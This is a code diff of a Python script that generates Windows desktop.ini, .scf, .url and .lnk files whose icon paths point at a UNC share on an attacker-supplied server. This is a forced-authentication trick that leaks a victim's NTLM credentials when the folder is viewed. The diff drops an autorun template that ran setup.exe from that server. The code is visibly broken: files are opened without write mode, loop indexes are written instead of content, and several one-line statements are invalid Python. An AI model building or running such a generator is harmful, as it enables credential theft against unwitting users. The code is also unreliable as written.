@@ -3,11 +3,6 @@
 # Rainer Christian Bjoern Herold
 
 def Generate_Files(mode, target_server, file_name, output_location):
-    autorun_file = f"""[autorun]
-open=\\{target_server}\setup.exe
-icon=something.ico
-action=open Setup.exe"""
-
     ini_file = f"""[.ShellClassInfo]
 IconResource=\\{target_server}\aa"""
 
@@ -26,15 +21,14 @@ WorkingDirectory=setup
 IconFile=\\{target_server}\%USERNAME%.icon
 IconIndex=1"""
 
-    Array_Modes, Array_Temp = [autorun_file, ini_file, scf_file, url_file], []
+    Array_Modes, Array_Temp = [ini_file, lnk_file, scf_file, url_file], []
 
     if (mode == 'all'):
         for _ in range (0, len(Array_Modes)):
-            if (_ == 0):   File_Name = f'{output_location}/{file_name}.autorun'
-            elif (_ == 1): File_Name = f'{output_location}/{file_name}.ini'
+            if (_ == 0):   File_Name = f'{output_location}/{file_name}.ini'
+            elif (_ == 1): File_Name = f'{output_location}/{file_name}.lnk'
             elif (_ == 2): File_Name = f'{output_location}/{file_name}.scf'
             elif (_ == 3): File_Name = f'{output_location}/{file_name}.url'
-            elif (_ == 4): File_Name = f'{output_location}/{file_name}.autorun'
 
             with open(File_Name) as f:
                 f.write(_)
@@ -44,7 +38,6 @@ IconIndex=1"""
         return Array_Temp
     
     elif (mode == 'ini'): with open(f'{output_location}/{file_name}.ini') as f: f.write(_)
-    elif (mode == 'inf'): with open(f'{output_location}/{file_name}.inf') as f: f.write(_)
     elif (mode == 'lnk'): with open(f'{output_location}/{file_name}.lnk') as f: f.write(_)
     elif (mode == 'scf'): with open(f'{output_location}/{file_name}.scf') as f: f.write(_)
     elif (mode == 'url'): with open(f'{output_location}/{file_name}.url') as f: f.write(_)
